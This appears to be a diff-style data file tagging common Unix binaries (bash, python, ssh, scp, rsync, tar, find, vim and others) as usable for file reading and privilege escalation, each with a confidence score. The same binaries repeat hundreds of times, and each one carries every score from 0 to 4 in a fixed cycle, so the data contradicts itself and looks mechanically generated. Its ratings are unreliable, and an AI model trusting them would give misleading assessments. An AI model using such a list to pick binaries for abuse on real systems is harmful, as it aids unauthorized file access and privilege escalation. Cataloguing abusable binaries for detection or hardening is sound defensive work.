+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
